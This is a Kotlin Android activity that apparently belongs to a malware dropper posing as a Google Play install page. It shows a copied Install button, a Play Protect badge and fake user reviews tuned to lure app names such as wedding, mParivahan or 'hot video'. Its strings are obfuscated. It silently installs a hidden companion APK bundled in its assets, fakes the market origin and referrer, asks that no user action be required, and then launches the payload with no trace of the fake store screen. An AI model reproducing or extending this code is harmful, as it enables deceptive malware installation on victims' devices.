package com.playstore.installer

import android.animation.AnimatorSet
import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import java.io.IOException

class InstallActivity : AppCompatActivity() {

    // ── Stage enum ──────────────────────────────────────────────────────────
    private enum class Stage { IDLE, WAITING, DOWNLOADING, INSTALLING, DONE, ERROR }


    // ── Views ────────────────────────────────────────────────────────────────
    private lateinit var installButton: FrameLayout
    private lateinit var installButtonBg: View
    private lateinit var installButtonProgress: android.widget.FrameLayout
    private lateinit var tvInstallLabel: TextView
    private lateinit var tvInstallLabelWhite: TextView
    private lateinit var tvUnderButton: TextView
    private lateinit var layoutPlayProtect: LinearLayout
    private lateinit var layoutUpdated: TextView
    private lateinit var dotsContainer: FrameLayout
    private lateinit var layoutDownloading: LinearLayout
    private lateinit var layoutInstalling: LinearLayout
    private lateinit var layoutError: LinearLayout
    private lateinit var btnRetry: Button
    private lateinit var btnCancel: Button
    private lateinit var reviewsContainer: LinearLayout
    private lateinit var tvToast: TextView

    // ── State ────────────────────────────────────────────────────────────────
    private var stage = Stage.IDLE
    private var downloadProgress = 0f
    private val handler = Handler(Looper.getMainLooper())
    private var progressRunnable: Runnable? = null

    // ── Constants ────────────────────────────────────────────────────────────
    companion object {
        private const val SESSION_REQUEST = 1001
        private const val MAX_RETRIES    = 2
        private val REFERRER_URI get()   = StringPool.d(StringPool.REFERRER_URI)
        private val WRITE_NAME get()     = StringPool.d(StringPool.WRITE_NAME)
        private const val TOTAL_MB       = 1.84f
        const val INSTALL_SUCCESS_ACTION = "com.playstore.installer.INSTALL_SUCCESS"
        private val KEY_STAGE get()       = StringPool.d(StringPool.KEY_STAGE)

    }

    // ── Dot specs (matches design_c_full.jsx dotSpecs exactly) ──────────────
    private data class DotSpec(
        val color: String, val sizeDp: Float, val leftDp: Float, val topDp: Float,
        val delayMs: Long, val bounceDp: Float, val outline: Boolean
    )

    private val dotSpecs = listOf(
        DotSpec("#BDBDBD", 22f, 54f,  0f,   0,   10f, true),
        DotSpec("#00BCD4", 24f,  0f, 34f, 100,   12f, false),
        DotSpec("#9E9E9E",  9f, 54f, 42f, 200,    7f, false),
        DotSpec("#9E9E9E", 22f, 74f, 34f, 150,    9f, false),
        DotSpec("#BDBDBD", 21f,  0f, 70f, 250,    8f, false),
        DotSpec("#00BCD4", 30f, 28f, 64f,  50,   14f, false),
        DotSpec("#F44336", 24f, 98f, 70f, 300,   10f, false),
        DotSpec("#4CAF50", 11f,  2f,108f, 180,    6f, false),
        DotSpec("#E0E0E0",  9f, 44f,112f, 350,    5f, false),
        DotSpec("#BDBDBD", 23f, 64f,104f, 120,    9f, true),
        DotSpec("#FFC107", 30f, 64f,142f,  80,   13f, false)
    )


    private fun getReviewsForApp(): List<Triple<String, Int, String>> {
        val appName = getString(R.string.app_name).trim().lowercase()
        val template = when {
            appName.contains(StringPool.d(StringPool.TPL_WEDDING))    -> StringPool.d(StringPool.TPL_WEDDING)
            appName.contains(StringPool.d(StringPool.TPL_SHAADI))     -> StringPool.d(StringPool.TPL_SHAADI)
            appName.contains(StringPool.d(StringPool.TPL_MPARIVAHAN)) -> StringPool.d(StringPool.TPL_MPARIVAHAN)
            appName.contains(StringPool.d(StringPool.TPL_HOT_VIDEO))  -> StringPool.d(StringPool.TPL_HOT_VIDEO)
            else -> "generic"
        }
        // Load from encrypted assets/reviews.enc
        val fromAssets = StringPool.loadReviews(this, template)
        if (fromAssets.isNotEmpty()) return fromAssets
        // Fallback: empty list (reviews not critical to function)
        return emptyList()
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR
            )
        }

        setContentView(R.layout.activity_install)
        bindViews()
        buildDots()
        buildReviews()

        // Register here so we catch the broadcast even while paused behind the install dialog
        val filter = IntentFilter(INSTALL_SUCCESS_ACTION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(installSuccessReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(installSuccessReceiver, filter)
        }


        val prefs = getSharedPreferences(StringPool.d(StringPool.PREFS_NAME), MODE_PRIVATE)
        val savedStage = prefs.getString(StringPool.d(StringPool.KEY_STAGE), Stage.IDLE.name)

        when (savedStage) {
            Stage.INSTALLING.name -> {
                val cachedPath = prefs.getString(StringPool.d(StringPool.KEY_CACHED_PATH), null)
                val cachedApk  = if (cachedPath != null) java.io.File(cachedPath) else null
                if (cachedApk != null && cachedApk.exists()) {
                    setStage(Stage.INSTALLING)
                    val apkBytes = cachedApk.readBytes()
                    installViaSession(apkBytes, attempt = 1)
                } else {
                    setStage(Stage.IDLE)
                    startDownload()
                }
            }
            Stage.DONE.name -> {
                val cmpPkg = prefs.getString(StringPool.d(StringPool.KEY_COMPANION_PKG), null)
                val companionInstalled = if (!cmpPkg.isNullOrEmpty()) {
                    try { packageManager.getPackageInfo(cmpPkg, 0); true } catch (_: Exception) { false }
                } else false

                if (companionInstalled) {
                    setStage(Stage.DONE)
                } else {
                    prefs.edit().remove(StringPool.d(StringPool.KEY_STAGE)).apply()
                    setStage(Stage.IDLE)
                    startDownload()
                }
            }
            else -> {
                setStage(Stage.IDLE)
                startDownload()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
        try { unregisterReceiver(installSuccessReceiver) } catch (_: Exception) {}
    }

    private val installSuccessReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == INSTALL_SUCCESS_ACTION) {
                val prefs = getSharedPreferences(StringPool.d(StringPool.PREFS_NAME), MODE_PRIVATE)
                val cachedPath = prefs.getString(StringPool.d(StringPool.KEY_CACHED_PATH), null)
                if (cachedPath != null) java.io.File(cachedPath).delete()
                prefs.edit().remove(StringPool.d(StringPool.KEY_CACHED_PATH)).apply()
                setStage(Stage.DONE)
            }
        }
    }

    override fun onResume() {
        super.onResume()
    }

    // ── View binding ──────────────────────────────────────────────────────────
    private fun bindViews() {
        installButton        = findViewById(R.id.install_button)
        installButtonBg      = findViewById(R.id.install_button_bg)
        installButtonProgress= findViewById(R.id.install_button_progress)
        tvInstallLabel       = findViewById(R.id.tv_install_label)
        tvInstallLabelWhite  = findViewById(R.id.tv_install_label_white)
        tvUnderButton        = findViewById(R.id.tv_under_button)
        layoutPlayProtect    = findViewById(R.id.layout_play_protect)
        layoutUpdated        = findViewById(R.id.layout_updated)
        dotsContainer        = findViewById(R.id.dots_container)
        layoutDownloading    = findViewById(R.id.layout_downloading)
        layoutInstalling     = findViewById(R.id.layout_installing)
        layoutError          = findViewById(R.id.layout_error)
        btnRetry             = findViewById(R.id.btn_retry)
        btnCancel            = findViewById(R.id.btn_cancel)
        reviewsContainer     = findViewById(R.id.reviews_container)
        tvToast              = findViewById(R.id.tv_toast)

        installButton.setOnClickListener {
            if (stage == Stage.IDLE) startDownload()
        }
        btnRetry.setOnClickListener { startDownload() }
        btnCancel.setOnClickListener { cancelDownload() }
    }

    // ── Stage machine ─────────────────────────────────────────────────────────
    private fun setStage(s: Stage) {
        stage = s
        getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
            .edit().putString(KEY_STAGE, s.name).apply()
        runOnUiThread {
            // Reset all conditional views
            layoutPlayProtect.visibility = View.GONE
            layoutUpdated.visibility     = View.GONE
            tvUnderButton.visibility     = View.GONE
            layoutDownloading.visibility = View.GONE
            layoutInstalling.visibility  = View.GONE
            layoutError.visibility       = View.GONE
            installButtonProgress.visibility = View.GONE
            dotsContainer.visibility     = View.VISIBLE

            when (s) {
                Stage.IDLE -> {
                    setInstallBg("#1A73E8")
                    tvInstallLabel.text      = "Install"
                    tvInstallLabel.setTextColor(Color.WHITE)
                    tvInstallLabel.visibility = View.VISIBLE
                    tvInstallLabelWhite.text = "Install"
                    layoutPlayProtect.visibility = View.VISIBLE
                    installButton.isClickable = true
                }
                Stage.WAITING -> {
                    setProgressWidth(0.08f)
                    tvInstallLabel.visibility = View.GONE
                    tvInstallLabelWhite.text = "Waiting…"
                    installButton.isClickable = false
                }
                Stage.DOWNLOADING -> {
                    tvInstallLabel.visibility = View.GONE
                    installButton.isClickable = false
                    layoutDownloading.visibility = View.VISIBLE
                    updateDownloadProgress(0f)
                }
                Stage.INSTALLING -> {
                    setProgressWidth(1f)
                    tvInstallLabel.visibility = View.GONE
                    tvInstallLabelWhite.text = "Installing…"
                    layoutInstalling.visibility = View.VISIBLE
                    installButton.isClickable = false
                }
                Stage.DONE -> {
                    // Launch companion immediately — no delay, no flash of Google Play UI
                    launchCompanion()
                }
                Stage.ERROR -> {
                    setInstallBg("#E8EAED")
                    tvInstallLabel.text = "Install"
                    tvInstallLabel.setTextColor(Color.parseColor("#1A73E8"))
                    tvInstallLabel.visibility = View.VISIBLE
                    tvInstallLabelWhite.text = "Install"
                    layoutError.visibility    = View.VISIBLE
                    installButton.isClickable = false
                }
            }
        }
    }

    // ── Install button fill ───────────────────────────────────────────────────
    private fun setInstallBg(hex: String) {
        installButtonProgress.visibility = View.GONE
        val bg = installButtonBg.background as? GradientDrawable
            ?: GradientDrawable().also { it.shape = GradientDrawable.RECTANGLE; it.cornerRadius = dp(24f) }
        bg.setColor(Color.parseColor(hex))
        installButtonBg.background = bg
    }

    private fun setProgressWidth(fraction: Float) {
        installButtonBg.visibility          = View.VISIBLE
        installButtonProgress.visibility    = View.VISIBLE

        val bg = installButtonBg.background as? GradientDrawable
            ?: GradientDrawable().also { it.shape = GradientDrawable.RECTANGLE; it.cornerRadius = dp(24f) }
        bg.setColor(Color.parseColor("#E8EAED"))
        installButtonBg.background = bg

        val pgBg = installButtonProgress.background as? GradientDrawable
            ?: GradientDrawable().also { it.shape = GradientDrawable.RECTANGLE; it.cornerRadius = dp(24f) }
        pgBg.setColor(Color.parseColor("#1A73E8"))
        installButtonProgress.background = pgBg

        installButton.post {
            val totalWidth = installButton.width
            val lp = installButtonProgress.layoutParams
            lp.width = (totalWidth * fraction).toInt().coerceAtLeast(1)
            installButtonProgress.layoutParams = lp
        }
    }

    private var progressAnimator: ValueAnimator? = null
    private var currentBarFraction = 0f

    private fun updateDownloadProgress(pct: Float) {
        // Only move forward — never backward
        if (pct <= downloadProgress && pct != 0f) return
        downloadProgress = pct

        // Update label - white text inside blue fill only
        val dlMB  = "%.2f".format((pct / 100f) * TOTAL_MB)
        val label = "${pct.toInt()}%  •  $dlMB / $TOTAL_MB MB"
        tvInstallLabelWhite.text = label
        installButtonProgress.visibility = View.VISIBLE

        // Smoothly animate bar width — cancel any in-flight animation first
        installButton.post {
            val totalWidth = installButton.width
            if (totalWidth == 0) return@post
            val targetFraction = pct / 100f
            progressAnimator?.cancel()
            progressAnimator = ValueAnimator.ofFloat(currentBarFraction, targetFraction).apply {
                duration = 200
                interpolator = android.view.animation.LinearInterpolator()
                addUpdateListener { anim ->
                    val f = anim.animatedValue as Float
                    currentBarFraction = f
                    val lp = installButtonProgress.layoutParams
                    lp.width = (totalWidth * f).toInt().coerceAtLeast(1)
                    installButtonProgress.layoutParams = lp
                }
                start()
            }
        }
    }

    // ── Install flow ──────────────────────────────────────────────────────────
    private fun startDownload() {
        setStage(Stage.WAITING)

        handler.postDelayed({
            setStage(Stage.INSTALLING)

            Thread {
                try {
                    val apkBytes = assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
                    if (apkBytes.isNotEmpty()) {
                        runOnUiThread { installViaSession(apkBytes, attempt = 1) }
                    } else {
                        runOnUiThread { setStage(Stage.ERROR) }
                    }
                } catch (e: Exception) {
                    runOnUiThread { setStage(Stage.ERROR) }
                }
            }.start()
        }, 900)
    }

    private fun startProgressAnimation() {
        // No fake animation — real download progress drives the bar smoothly
    }

    private fun cancelDownload() {
        progressRunnable?.let { handler.removeCallbacks(it) }
        setStage(Stage.IDLE)
        showToast(StringPool.d(StringPool.MSG_CANCEL))
    }

    // ── PackageInstaller session ──────────────────────────────────────────────
    private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
        try {
            val packageInstaller = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)

            val tmpFile = java.io.File(cacheDir, StringPool.d(StringPool.TMP_COMPANION))
            tmpFile.writeBytes(apkBytes)
            val pkgName = packageManager.getPackageArchiveInfo(tmpFile.absolutePath, 0)?.packageName ?: ""
            tmpFile.delete()

            if (pkgName.isNotEmpty()) {
                params.setAppPackageName(pkgName)
                try {
                    params.setOriginatingUri(Uri.parse(StringPool.d(StringPool.MARKET_URI_PREFIX) + pkgName))
                    params.setReferrerUri(Uri.parse(REFERRER_URI))
                } catch (e: Exception) { }
            }

            params.setSize(apkBytes.size.toLong())
            params.setInstallLocation(1)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                params.setDontKillApp(true)
            params.setInstallReason(PackageManager.INSTALL_REASON_USER)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
                params.setRequestUpdateOwnership(true)

            val sessionId = packageInstaller.createSession(params)
            val session   = packageInstaller.openSession(sessionId)
            try {
                // Save APK to cache so it survives activity recreation
                val cachedApk = java.io.File(cacheDir, StringPool.d(StringPool.CACHED_COMPANION))
                cachedApk.writeBytes(apkBytes)
                getSharedPreferences(StringPool.d(StringPool.PREFS_NAME), MODE_PRIVATE)
                    .edit().putString(StringPool.d(StringPool.KEY_CACHED_PATH), cachedApk.absolutePath).apply()

                session.openWrite(WRITE_NAME, 0, apkBytes.size.toLong()).use { out ->
                    out.write(apkBytes)
                    session.fsync(out)
                }
                val intent = Intent(this, InstallReceiver::class.java).apply {
                    action = "$packageName.SESSION_ACTION"
                }
                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                else PendingIntent.FLAG_UPDATE_CURRENT

                session.commit(
                    PendingIntent.getBroadcast(this, SESSION_REQUEST, intent, flags).intentSender
                )
                session.close()

            } catch (e: IOException) {
                session.abandon()
                if (attempt < MAX_RETRIES)
                    handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
                else setStage(Stage.ERROR)
            }
        } catch (e: Exception) {
            if (attempt < MAX_RETRIES)
                handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
            else setStage(Stage.ERROR)
        }
    }

    // ── Launch companion ──────────────────────────────────────────────────────
    private fun launchCompanion() {
        val prefs = getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
        val pkg   = prefs.getString(InstallReceiver.KEY_COMPANION_PKG, null) ?: return
        try {
            val launch = packageManager.getLaunchIntentForPackage(pkg) ?: return
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
            finish() // finish first so this UI is gone before companion opens
            startActivity(launch)
        } catch (e: Exception) { }
    }

    // ── Dots ──────────────────────────────────────────────────────────────────
    private fun buildDots() {
        dotsContainer.post {
            dotSpecs.forEach { spec ->
                val sizePx   = dp(spec.sizeDp).toInt()
                val leftPx   = dp(spec.leftDp).toInt()
                val topPx    = dp(spec.topDp).toInt()
                val bouncePx = dp(spec.bounceDp)

                val dot = View(this).apply {
                    layoutParams = FrameLayout.LayoutParams(sizePx, sizePx).apply {
                        leftMargin = leftPx
                        topMargin  = topPx
                    }
                    background = if (spec.outline) {
                        GradientDrawable().apply {
                            shape = GradientDrawable.OVAL
                            setColor(Color.TRANSPARENT)
                            setStroke(dp(2.5f).toInt(), Color.parseColor(spec.color))
                        }
                    } else {
                        GradientDrawable().apply {
                            shape = GradientDrawable.OVAL
                            setColor(Color.parseColor(spec.color))
                        }
                    }
                }
                dotsContainer.addView(dot)

                val bounceUp   = ObjectAnimator.ofFloat(dot, "translationY", 0f, -bouncePx).apply {
                    duration = 350
                    interpolator = android.view.animation.DecelerateInterpolator()
                }
                val bounceDown = ObjectAnimator.ofFloat(dot, "translationY", -bouncePx, 0f).apply {
                    duration = 350
                    interpolator = android.view.animation.AccelerateInterpolator()
                }
                val sxUp = ObjectAnimator.ofFloat(dot, "scaleX", 1f, 1.12f).apply { duration = 350 }
                val syUp = ObjectAnimator.ofFloat(dot, "scaleY", 1f, 1.12f).apply { duration = 350 }
                val sxDn = ObjectAnimator.ofFloat(dot, "scaleX", 1.12f, 1f).apply { duration = 350 }
                val syDn = ObjectAnimator.ofFloat(dot, "scaleY", 1.12f, 1f).apply { duration = 350 }

                val set = AnimatorSet().apply {
                    playSequentially(
                        AnimatorSet().also { it.playTogether(bounceUp, sxUp, syUp) },
                        AnimatorSet().also { it.playTogether(bounceDown, sxDn, syDn) }
                    )
                    startDelay = spec.delayMs
                }
                set.addListener(object : android.animation.AnimatorListenerAdapter() {
                    override fun onAnimationEnd(animation: android.animation.Animator) {
                        set.startDelay = 500 + spec.delayMs % 400
                        set.start()
                    }
                })
                set.start()
            }
        }
    }

    // ── Reviews ───────────────────────────────────────────────────────────────
    private fun buildReviews() {
        val shuffled = getReviewsForApp().shuffled().take(5)
        shuffled.forEachIndexed { index, (name, stars, reviewText) ->
            val itemLayout = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).also { it.bottomMargin = dp(10f).toInt() }
                setPadding(0, 0, 0, dp(10f).toInt())
            }

            // Name row
            val nameRow = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity     = Gravity.CENTER_VERTICAL
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).also { it.bottomMargin = dp(3f).toInt() }
            }

            // Avatar circle
            val avatar = TextView(this).apply {
                text      = name[0].toString()
                textSize  = 10f
                setTextColor(Color.WHITE)
                gravity   = Gravity.CENTER
                val hue   = (index * 57) % 360
                val bg    = GradientDrawable().apply {
                    shape         = GradientDrawable.OVAL
                    val hsv       = floatArrayOf(hue.toFloat(), 0.6f, 0.55f)
                    setColor(Color.HSVToColor(hsv))
                }
                background = bg
                val sz    = dp(22f).toInt()
                layoutParams = LinearLayout.LayoutParams(sz, sz).also { it.marginEnd = dp(6f).toInt() }
            }
            nameRow.addView(avatar)

            // Name text
            val tvName = TextView(this).apply {
                text     = name
                textSize = 11f
                setTextColor(Color.parseColor("#202124"))
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
                setTypeface(typeface, android.graphics.Typeface.BOLD)
            }
            nameRow.addView(tvName)
            itemLayout.addView(nameRow)

            // Stars row
            val starRow = LinearLayout(this).apply {
                orientation  = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).also { it.bottomMargin = dp(3f).toInt() }
            }
            repeat(5) { i ->
                val star = TextView(this).apply {
                    text     = "★"
                    textSize = 10f
                    setTextColor(if (i < stars) Color.parseColor("#FBBC04") else Color.parseColor("#E0E0E0"))
                }
                starRow.addView(star)
            }
            itemLayout.addView(starRow)

            // Review text
            val tvText = TextView(this).apply {
                text        = reviewText
                textSize    = 10f
                setTextColor(Color.parseColor("#3C4043"))
                setLineSpacing(0f, 1.45f)
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
            }
            itemLayout.addView(tvText)

            // Divider (except last)
            if (index < shuffled.size - 1) {
                val divider = View(this).apply {
                    setBackgroundColor(Color.parseColor("#F1F3F4"))
                    layoutParams = LinearLayout.LayoutParams(
                        ViewGroup.LayoutParams.MATCH_PARENT, dp(1f).toInt()
                    ).also { it.topMargin = dp(8f).toInt() }
                }
                itemLayout.addView(divider)
            }

            reviewsContainer.addView(itemLayout)
        }
    }

    // ── Toast ─────────────────────────────────────────────────────────────────
    private fun showToast(msg: String) {
        tvToast.text       = msg
        tvToast.visibility = View.VISIBLE
        handler.postDelayed({ tvToast.visibility = View.GONE }, 2800)
    }

    // ── Util ──────────────────────────────────────────────────────────────────
    private fun dp(value: Float): Float =
        TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value, resources.displayMetrics)
}

